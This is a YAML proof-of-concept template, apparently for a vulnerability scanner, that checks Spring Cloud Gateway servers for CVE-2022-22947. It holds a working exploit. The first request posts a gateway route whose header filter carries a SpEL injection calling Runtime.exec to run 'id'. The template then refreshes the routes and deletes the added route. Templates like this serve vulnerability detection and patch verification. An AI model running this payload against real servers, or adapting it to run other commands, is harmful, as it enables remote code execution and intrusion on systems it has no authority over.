name: poc-yaml-spring-cloud-cve-2022-22947
set:
  r: randomLowercase(8)
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /actuator/gateway/routes/{{r}}
      headers:
        Content-Type: application/json
      body: |
        {
          "id": "hacktest",
          "filters": [{
            "name": "AddResponseHeader",
            "args": {
              "name": "Result",
              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
            }
          }],
          "uri": "http://example.com"
        }
    expression: |
        response.status == 201
  r1:
    request:
      cache: true
      method: POST
      path: /actuator/gateway/refresh
      headers:
        Content-Type: application/x-www-form-urlencoded
    expression: |
        response.status == 200
  r2:
    request:
      cache: true
      method: DELETE
      path: /actuator/gateway/routes/{{r}}
    expression: |
        response.status == 200
expression: r0() && r1() && r2()
detail:
  author: rns(https://github.com/rnsss)
  links:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
    - https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
    - https://github.com/wdahlenburg/spring-gateway-demo
    - https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published
    - https://tanzu.vmware.com/security/cve-2022-22947
  Affected Version: Spring Cloud Gateway < 3.0.6, 3.1.0
